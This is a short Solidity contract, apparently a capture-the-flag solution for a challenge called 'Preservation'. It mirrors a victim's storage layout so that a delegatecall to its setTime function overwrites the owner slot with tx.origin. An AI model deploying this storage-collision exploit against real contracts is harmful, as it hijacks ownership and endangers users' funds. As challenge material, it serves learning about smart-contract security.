// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ITime {
    function setTime(uint256 _time) external;
}

contract MyPreservationAttack is ITime {
    address public slot0;
    address public slot1;
    address public owner;

    function setTime(uint256 _time) public override {
        owner = tx.origin;
    }
}
